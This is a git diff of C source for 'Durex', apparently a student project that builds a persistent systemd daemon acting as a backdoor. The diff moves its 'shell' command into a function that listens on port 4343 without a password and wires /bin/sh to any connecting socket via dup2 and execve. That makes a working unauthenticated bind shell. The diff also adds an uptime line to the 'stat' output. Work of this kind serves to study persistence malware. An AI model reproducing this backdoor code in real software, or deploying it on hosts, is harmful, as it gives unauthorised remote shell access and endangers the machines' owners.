@@ -6,7 +6,7 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/27 13:03:01 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/27 16:19:13 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,6 +15,8 @@
 #include <stdlib.h>
 #include <fcntl.h>
 #include <sys/socket.h>
+#include <time.h>
+#include <stdio.h>
 #include "Durex.h"
 #include "server.h"
 #include "Daemon.h"
@@ -23,27 +25,28 @@ extern char **environ;
 
 static t_bool	server_cmd_help(t_client *client, t_server *server)
 {
-	char *help_content =	"\n   ======================================================================   \n"
-							"============================================================================\n"
-							COLORIZE(SH_YELLOW, " Durex commands:\n")
-							"\t'help' or '?'\t- Show this message.\n"
-							"\t'exit'\t\t- Quit Durex.\n"
-							"\t'shell'\t\t- Spawn a shell on port 4343.\n"
-							"\t'uninstall'\t- Uninstall Durex. (/!\\ kill Durex daemon on success /!\\)\n"
-							"\t'log'\t\t- Print durex log file.\n"
-							"\t'stat'\t\t- Print status and information about durex.\n\n"
-							COLORIZE(SH_YELLOW, " Informations:\n")
-							" * You can check install status with 'stat' command.\n"
-							" * You can check service status by running: systemctl status durex in shell.\n"
-							" * A corrupt installation mean, one of this file is missing:\n\t"
-							SERVICE_FILE "\n\t" SERVICE_INSTALL_FILE "\n\t" SERVICE_BIN "\n"
-							COLORIZE(SH_YELLOW, " Manual Uninstall:\n")
-							" Spawn a shell, using 'shell' then run each following commands:\n"
-							" systemctl stop durex;\n systemctl disable durex;\n systemtcl daemon-reload;\n"
-							" systemctl reset-failed;\n rm /var/lock/durex.lock;\n"
-							" And finally remove all listed file in Informations sections.\n"
-							"============================================================================\n"
-							"   ======================================================================   \n\n";
+	char *help_content = ""
+		"\n   ======================================================================   \n"
+		"============================================================================\n"
+		COLORIZE(SH_YELLOW, " Durex commands:\n")
+		"\t'help' or '?'\t- Show this message.\n"
+		"\t'exit'\t\t- Quit Durex.\n"
+		"\t'shell'\t\t- Spawn a shell on port 4343.\n"
+		"\t'uninstall'\t- Uninstall Durex. (/!\\ kill Durex daemon on success /!\\)\n"
+		"\t'log'\t\t- Print durex log file.\n"
+		"\t'stat'\t\t- Print status and information about durex.\n\n"
+		COLORIZE(SH_YELLOW, " Informations:\n")
+		" * You can check install status with 'stat' command.\n"
+		" * You can check service status by running: systemctl status durex in shell.\n"
+		" * A corrupt installation mean, one of this file is missing:\n\t"
+		SERVICE_FILE "\n\t" SERVICE_INSTALL_FILE "\n\t" SERVICE_BIN "\n"
+		COLORIZE(SH_YELLOW, " Manual Uninstall:\n")
+		" Spawn a shell, using 'shell' then run each following commands:\n"
+		" systemctl stop durex;\n systemctl disable durex;\n systemtcl daemon-reload;\n"
+		" systemctl reset-failed;\n rm /var/lock/durex.lock;\n"
+		" And finally remove all listed file in Informations sections.\n"
+		"============================================================================\n"
+		"   ======================================================================   \n\n";
 	if (!server || !client)
 		return (false);
 	send_text(help_content, client->socket);
@@ -71,12 +74,33 @@ static t_bool	server_cmd_log(t_client *client, t_server *server)
 	return (true);
 }
 
+static void		shell_wait(t_server *remote_shell, t_client *client)
+{
+	t_client	*clt;
+	char		*sh[] = { "/bin/sh", NULL };
+
+	clt = NULL;
+	send_text(COLORIZE(SH_GREEN, "\t• ") "shell is waiting for connexion.\n"SERVER_PROMPT, client->socket);
+	close(client->socket);
+	while (1)
+	{
+		if (!new_client(remote_shell))
+		{
+			send_text(COLORIZE(SH_RED, "\t• ") "Failed, to connect.\n", client->socket);
+			continue ;
+		}
+		clt = (t_client*)remote_shell->client_lst->content;
+		dup2(clt->socket, 0);
+		dup2(clt->socket, 1);
+		dup2(clt->socket, 2);
+		execve(sh[0], sh, environ);
+	}
+}
+
 static t_bool	server_cmd_shell(t_client *client, t_server *server)
 {
 	t_server	remote_shell;
 	pid_t		pid;
-	char		*sh[] = { "/bin/sh", NULL };
-	t_client	*clt;
 
 	if (!server || !client)
 		return (false);
@@ -94,23 +118,7 @@ static t_bool	server_cmd_shell(t_client *client, t_server *server)
 		remote_shell.require_pass = false;
 		close(server->socket);
 		if (create_server(&remote_shell, 4343, 2))
-		{
-			send_text(COLORIZE(SH_GREEN, "\t• ") "shell is waiting for connexion.\n"SERVER_PROMPT, client->socket);
-			close(client->socket);
-			while (1)
-			{
-				if (!new_client(&remote_shell))
-				{
-					send_text(COLORIZE(SH_RED, "\t• ") "Failed, to connect.\n", client->socket);
-					continue ;
-				}
-				clt = (t_client*)remote_shell.client_lst->content;
-				dup2(clt->socket, 0);
-				dup2(clt->socket, 1);
-				dup2(clt->socket, 2);
-				execve(sh[0], sh, environ);
-			}
-		}
+			shell_wait(&remote_shell, client);
 		send_text(COLORIZE(SH_RED, "\t• ") "Failed, wait and retry.\n"SERVER_PROMPT, client->socket);
 		close(client->socket);
 		durex_log("The remote shell has failed.", LOG_WARNING);
@@ -177,7 +185,7 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 	char	*header = NULL;
 	char	*install_status = NULL;
 	char	*clients = NULL;
-	char	*footer = "\n";
+	char	footer[64] = {0};
 	char	*final_status = NULL;
 	size_t	status_len;
 
@@ -191,6 +199,7 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 		install_status = "Durex install: "COLORIZE(SH_YELLOW, "• ")
 			"Not install or corrupt. (see help)\n\tConnexions:\n\t";
 	clients = get_client_list(server);
+	sprintf(footer, "Durex running since: %.0f seconds.\n", difftime(time(NULL), server->start_time));
 	status_len = ft_strlen(header) + ft_strlen(install_status) + ft_strlen(clients) + ft_strlen(footer);
 	final_status = ft_strnew(status_len);
 	ft_strncpy(final_status, header, ft_strlen(header));
